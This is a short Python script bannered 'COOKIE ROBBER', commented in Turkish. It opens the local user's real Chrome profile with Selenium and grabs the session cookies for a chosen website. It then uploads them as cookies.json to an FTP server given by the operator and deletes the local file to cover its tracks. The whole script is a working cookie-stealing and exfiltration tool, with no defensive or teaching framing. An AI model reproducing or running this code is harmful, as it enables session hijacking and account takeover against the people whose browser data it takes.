from selenium import webdriver
import os
import json
import ftplib
from selenium.webdriver.chrome.options import Options


banner="""
 ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗    ██████╗ ██╗   ██╗██████╗ ██████╗ ███████╗██████╗ 
██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝    ██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗      ██████╔╝██║   ██║██████╔╝██████╔╝█████╗  ██████╔╝
██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝      ██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗    ██║  ██║╚██████╔╝██████╔╝██████╔╝███████╗██║  ██║
 ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                                                                                                            
"""
print(banner)
site = input("Website => ")
ftph = input("FTP Host => ")
ftpu = input("FTP User => ")
ftpp = input("FTP Password => ")

# Chrome tarayıcısını başlat
options = webdriver.ChromeOptions()
user_name = os.getlogin()
options.add_argument(f"--user-data-dir=C:/Users/{user_name}/AppData/Local/Google/Chrome/User Data")
driver = webdriver.Chrome(chrome_options=options)

# siteye git
driver.get(site)

# çerezleri al
cookies = driver.get_cookies()

# tarayıcıyı kapat
driver.close()

# çerezleri json dosyasına yaz
with open("cookies.json", "w") as f:
    json.dump(cookies, f)

ftp = ftplib.FTP(ftph)
ftp.login(ftpu,ftpp)
ftp.cwd('/public_html/')
# json dosyasını ftp sunucusuna yükle
with open("cookies.json", "rb") as f:
    ftp.storbinary("STOR cookies.json", f)

ftp.quit()

# json dosyasını sil
os.remove("cookies.json")
